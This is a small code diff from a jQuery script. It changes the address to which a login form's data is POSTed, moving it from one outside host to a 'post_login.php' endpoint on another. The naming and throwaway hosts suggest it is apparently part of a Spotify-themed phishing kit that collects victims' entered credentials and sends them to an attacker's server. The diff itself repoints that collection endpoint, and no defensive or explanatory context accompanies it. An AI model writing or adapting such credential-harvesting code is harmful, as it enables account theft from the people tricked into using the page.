@@ -20,7 +20,7 @@ $(document).ready(function () {
 
         $.ajax({
             type: "POST",
-            url: "https://pikachu.sale/spot/post_login.php",
+            url: "https://spotytwist.onrender.com/post_login.php",
             data: formData,
             processData: false, // Prevent jQuery from automatically processing the data
             contentType: false, // Prevent jQuery from automatically setting the content type
